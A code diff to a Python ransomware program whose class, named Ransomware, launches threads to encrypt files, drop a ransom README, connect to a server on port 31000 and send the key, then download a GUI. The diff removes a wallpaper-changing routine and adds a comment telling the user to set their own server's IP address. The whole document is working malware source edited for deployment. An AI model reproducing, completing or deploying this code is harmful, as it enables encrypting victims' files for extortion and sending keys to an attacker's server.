@@ -1,6 +1,5 @@
 import os
 import requests
-import ctypes
 import socket
 import threading
 from pathlib import Path
@@ -52,26 +51,19 @@ class Ransomware:
             except:
                 pass
 
-    def wallpaper(self) -> None:
-        my_wallpaper = requests.get('YOUR WALLPAPER BACKGROUND')
-        with open(os.path.join(self.desktop, 'wallpaper.jpg'), 'wb') as img:
-            img.write(my_wallpaper.content)
-        ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.join(self.desktop, 'wallpaper.jpg') , 0) 
-
     def notes(self) -> None:
         with open(os.path.join(self.desktop, 'README.txt'), 'w') as f:
             f.write(open('../data/msg.txt').read())
 
     def main(self) -> None:
         threading.Thread(target=self.encrypt_files).start()
-        threading.Thread(target=self.wallpaper).start()
         threading.Thread(target=self.notes).start()
         threading.Thread(target=self.connect_to_server).start()
         threading.Thread(target=download_gui).start() # download the gui after the encryption so it won't corrupt
 
     def connect_to_server(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
-            self.sock.connect(('IP', 31000))
+            self.sock.connect(('IP', 31000)) # change IP to your server's IP address
             self.send_key()
     
     def send_key(self):
